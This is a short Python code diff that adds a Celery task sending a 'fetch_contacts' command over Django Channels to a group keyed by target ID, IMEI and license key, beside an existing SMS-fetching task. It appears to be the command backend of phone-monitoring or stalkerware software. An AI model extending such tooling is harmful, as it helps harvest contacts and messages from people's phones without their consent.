@@ -20,6 +20,20 @@ def send_email(subject, message, recipient):
     except Exception as e:
         print(f"Error sending to {recipient}: {e}")
 
+@shared_task
+def fetch_contacts_socket(target_id, imei, license_key):
+    channel_layer = get_channel_layer()
+    if channel_layer:
+        try:
+            async_to_sync(channel_layer.group_send)(
+                f"target_{target_id}_{imei}_{license_key}",
+                {
+                    "type": "fetch_contacts",
+                }
+            )
+            logger.info("Fetched contacts from server")
+        except Exception as e:
+            logger.error(f"Error fetching contacts: {e}")
 
 @shared_task
 def fetch_sms(target_id, imei, license_key):
